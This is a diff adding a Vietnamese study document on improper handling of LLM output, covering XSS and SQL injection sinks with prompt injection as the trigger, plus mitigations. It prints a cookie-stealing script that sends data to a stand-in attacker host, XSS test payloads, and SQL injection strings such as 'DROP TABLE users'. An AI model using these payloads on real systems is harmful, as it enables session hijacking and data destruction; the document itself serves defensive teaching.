@@ -270,3 +270,293 @@ LLM03:2026 Excessive Agency là lỗ hổng xảy ra khi hệ thống cấp cho 
 
 Excessive Agency không thể loại bỏ hoàn toàn — vì LLM luôn có thể sai. Nhưng có thể **giới hạn thiệt hại** bằng cách giảm chức năng, giảm quyền, và giảm tự chủ của agent.
 
+---
+
+# PHẦN 2 — LLM10:2026 IMPROPER OUTPUT HANDLING
+
+> **Vai trò trong chuỗi tấn công:** Hệ quả về output (Sink)
+> **Entry vector:** LLM01 Prompt Injection
+> **Khác LLM03:** LLM03 nói về **quyền và tự chủ** của agent. LLM10 nói về **cách xử lý output** trước khi đưa downstream.
+
+---
+
+## 1. KHÁI NIỆM
+
+### 1.1. Định nghĩa
+
+**Improper Output Handling** là lỗ hổng xảy ra khi output của LLM được đưa đến downstream **mà không qua kiểm tra, làm sạch, mã hóa, hoặc xử lý an toàn**. Đây là lỗi ở **output boundary**.
+
+Nói đơn giản:
+
+> Output của LLM phải được đối xử như **input từ người dùng không tin cậy**. Nếu đưa thẳng output vào browser hoặc database mà không kiểm tra, thiệt hại xảy ra.
+
+**Ví dụ:** AI agent được yêu cầu "viết mô tả sản phẩm". LLM sinh:
+
+```html
+Sản phẩm tuyệt vời! <script>fetch('http://attacker.com?c='+document.cookie)</script>
+```
+
+Nếu chat UI render output này trực tiếp, browser chạy script và gửi cookie của user đến attacker.
+
+**Điểm mấu chốt:** Vấn đề không nằm ở nội dung output — mà nằm ở **cách hệ thống xử lý output**.
+
+---
+
+### 1.2. Khác gì LLM03?
+
+| Tiêu chí | LLM03 Excessive Agency | LLM10 Improper Output Handling |
+|---|---|---|
+| **Bản chất** | Agent có quá nhiều quyền/tự chủ | Output không được xử lý an toàn |
+| **Câu hỏi** | Agent được phép làm gì? | Output được dùng thế nào? |
+| **Ví dụ** | Tool có quyền DELETE | Output chứa `<script>` render thẳng lên web |
+| **Mitigation** | Least privilege, approval | Validate, sanitize, encode |
+
+**Mối quan hệ:**
+
+```
+LLM03 (agent có quyền ghi vào DB)
+   ↓
+LLM10 (output không validate)
+   ↓
+XSS / SQL Injection
+```
+
+LLM03 là **điều kiện**, LLM10 là **điểm khai thác**.
+
+---
+
+### 1.3. Output đi qua những đâu?
+
+Output của LLM đi qua 4 lớp xử lý trước khi đến sink:
+
+1. **LLM sinh output** — text, HTML, SQL, JSON.
+2. **Validate** — kiểm tra đúng định dạng, ngữ cảnh.
+3. **Sanitize** — loại bỏ ký tự nguy hiểm.
+4. **Encode** — chuyển đổi cho đúng ngữ cảnh đích.
+5. **Sử dụng** — browser, database.
+
+Nếu bất kỳ bước 2, 3, hoặc 4 bị bỏ qua → output đi thẳng từ LLM đến sink → thiệt hại.
+
+---
+
+### 1.4. Ba lỗ hổng trong xử lý output
+
+**1. Thiếu Validation — Không kiểm tra output**
+
+- Output SQL chạy trực tiếp mà không parameterize.
+- Output render lên web mà không kiểm tra XSS.
+- Output không được kiểm tra schema trước khi parse.
+
+**2. Thiếu Sanitization — Không làm sạch output**
+
+- Không loại bỏ `<script>`, `onerror=`, `javascript:` trước khi render HTML.
+- Không loại bỏ `;`, `--`, `UNION` trước khi đưa vào SQL.
+- Không loại bỏ ký tự đặc biệt trước khi render.
+
+**3. Thiếu Encoding — Không mã hóa output**
+
+- Không HTML-encode trước khi render web.
+- Không SQL-escape trước khi đưa vào query.
+- Không JavaScript-encode trước khi đưa vào script.
+
+---
+
+### 1.5. Trigger
+
+- **Direct prompt injection:** User chèn instruction độc hại vào prompt.
+- **Indirect prompt injection:** Nội dung từ web/email/document chứa instruction độc hại.
+- **Hallucination:** Model tự sinh output độc hại.
+- **Malicious tool output:** Tool trả output chứa instruction độc hại.
+
+Một khi trigger thành công, LLM sinh output độc hại. Nếu hệ thống không validate/sanitize/encode → thiệt hại.
+
+---
+
+### 1.6. Hai hậu quả chính
+
+**1. XSS (Cross-Site Scripting)**
+
+- Output chứa JavaScript độc hại render lên browser.
+- Hậu quả: session hijack, credential theft, defacement.
+- Sink: browser.
+
+**2. SQL Injection**
+
+- Output chứa SQL độc hại chạy vào database.
+- Hậu quả: đọc/xóa dữ liệu, leo thang quyền.
+- Sink: SQL database.
+
+---
+
+## 2. OUTPUT ĐI ĐÂU? — CÁC SINK
+
+### 2.1. Browser — XSS
+
+#### 2.1.1. Bước đầu detect — HTML Injection
+
+Trước khi khai thác XSS, cần kiểm tra ứng dụng có render HTML từ output LLM không. Đây là bước detect đơn giản nhất.
+
+**Cách test:**
+
+- Yêu cầu LLM sinh output chứa thẻ HTML đơn giản:
+
+```html
+<h1>Test HTML Injection</h1>
+```
+
+- Nếu chat UI hiển thị heading (to, đậm) → ứng dụng render HTML trực tiếp.
+- Nếu chat UI hiển thị nguyên văn `<h1>Test HTML Injection</h1>` → ứng dụng đã encode, an toàn hơn.
+
+**Tại sao đây là bước đầu:**
+
+- HTML injection cho thấy output LLM không được encode.
+- Nếu HTML render được → khả năng cao JavaScript cũng chạy → XSS.
+- Đây là dấu hiệu sớm nhất của lỗ hổng ở sink browser.
+
+**Từ HTML injection → XSS:**
+
+- Sau khi xác nhận, thử chèn `<script>` hoặc event handler.
+- Ví dụ: `<img src=x onerror=alert(1)>`.
+- Nếu alert hiện lên → XSS confirmed.
+
+#### 2.1.2. Các dạng XSS qua LLM output
+
+- **Script injection:** `<script>alert(1)</script>`.
+- **Event handler injection:** `<img src=x onerror=alert(1)>`.
+- **SVG injection:** `<svg onload=alert(1)>`.
+- **Markdown injection:** `[click](javascript:alert(1))`.
+
+**Ví dụ khai thác:**
+
+```html
+<script>fetch('http://attacker.com?c='+document.cookie)</script>
+```
+
+Browser chạy script → gửi cookie đến attacker → session hijack.
+
+**Tại sao nguy hiểm:**
+
+- User không biết mình đang bị tấn công.
+- Script chạy với quyền của user — đọc cookie, localStorage, gửi request thay user.
+- Có thể lây lan sang user khác nếu output được lưu (stored XSS).
+
+---
+
+### 2.2. SQL Database — SQL Injection
+
+**Output đi vào SQL database như thế nào?**
+
+Khi agent dùng LLM sinh SQL query từ câu hỏi tự nhiên, output LLM là SQL string. Nếu chạy trực tiếp mà không parameterize, attacker chèn SQL độc hại.
+
+**Ví dụ khai thác:**
+
+User hỏi: "Xem user có id là 1."
+
+LLM sinh:
+
+```sql
+SELECT * FROM users WHERE id = 1
+```
+
+Attacker hỏi: "Xem user có id là `1; DROP TABLE users; --`"
+
+LLM sinh:
+
+```sql
+SELECT * FROM users WHERE id = 1; DROP TABLE users; --
+```
+
+Query chạy → bảng users bị xóa.
+
+**Các dạng SQL injection:**
+
+- **UNION-based:** `1 UNION SELECT password FROM users`.
+- **Stacked queries:** `1; DROP TABLE users; --`.
+- **Blind SQLi:** `1 AND 1=1`.
+- **Time-based:** `1; WAITFOR DELAY '0:0:5'`.
+
+**Tại sao nguy hiểm:**
+
+- Đọc toàn bộ database.
+- Xóa/sửa dữ liệu.
+- Leo thang quyền nếu DB user có quyền cao.
+
+---
+
+## 3. PHÒNG CHỐNG
+
+Output LLM cần xử lý qua 4 bước trước khi dùng.
+
+### 3.1. Validate
+
+1. **Treat model as untrusted user** — zero-trust: output LLM validate như input từ user.
+2. **Strict schema validation** — định nghĩa schema chặt, validate trước khi dùng.
+3. **Follow OWASP ASVS** — tuân thủ hướng dẫn input validation.
+
+### 3.2. Sanitize
+
+4. **Sanitize HTML** — loại bỏ `<script>`, `<iframe>`, `onerror=`, `onload=`, `javascript:`.
+5. **Sanitize SQL input** — loại bỏ `;`, `--`, `/*`, `*/` (không thay thế parameterized query).
+6. **Disable auto-fetch** — tắt auto-render Markdown image, link preview, iframe.
+
+### 3.3. Encode
+
+7. **Context-aware output encoding** — HTML-encode cho web, JavaScript-encode cho script, SQL-escape cho query.
+8. **Parameterized queries** — dùng prepared statement, không nối chuỗi SQL.
+9. **Content Security Policy (CSP)** — CSP mạnh để mitigate XSS.
+
+### 3.4. Handle
+
+10. **Logging & monitoring** — log output, monitor pattern bất thường.
+11. **Rate limiting & circuit breakers** — giới hạn số lần thực thi output.
+12. **Human-in-the-loop** — duyệt trước hành động rủi ro cao.
+
+### 3.5. Bảng theo sink
+
+**Browser (XSS):**
+
+- Output encoding — HTML-encode, JavaScript-encode.
+- Sanitize HTML — loại bỏ thẻ và attribute nguy hiểm.
+- CSP.
+- Disable auto-fetch.
+
+**SQL Database (SQLi):**
+
+- Parameterized queries.
+- Least privilege — DB identity chỉ có quyền cần thiết.
+- Validate output trước khi đưa vào query.
+- Sanitize ký tự đặc biệt.
+
+---
+
+## 4. KẾT LUẬN
+
+LLM10 là lỗ hổng xảy ra khi output LLM được đưa đến downstream **mà không qua kiểm tra, làm sạch, mã hóa, hoặc xử lý an toàn**. Vấn đề nằm ở **cách hệ thống xử lý output**.
+
+**Ba lỗ hổng:**
+
+- Thiếu Validation — không kiểm tra output.
+- Thiếu Sanitization — không loại bỏ ký tự nguy hiểm.
+- Thiếu Encoding — không mã hóa cho đúng ngữ cảnh.
+
+**Hai hậu quả chính:**
+
+- **XSS:** output chứa JS độc hại render lên browser.
+- **SQL Injection:** output chứa SQL độc hại chạy vào database.
+
+**Bốn nhóm giải pháp:**
+
+- **Validate:** zero-trust, schema validation.
+- **Sanitize:** HTML, SQL, disable auto-fetch.
+- **Encode:** context-aware encoding, parameterized queries, CSP.
+- **Handle:** logging, rate limit, human-in-the-loop.
+
+**Nguyên tắc cốt lõi:**
+
+> Output LLM là **untrusted input**. Không bao giờ đưa output vào browser hoặc SQL mà không validate, sanitize, encode, và handle an toàn.
+
+**Khác với LLM03:**
+
+- LLM03 nói về **quyền và tự chủ** của agent.
+- LLM10 nói về **cách xử lý output** downstream.
+- LLM03 là điều kiện, LLM10 là điểm khai thác.
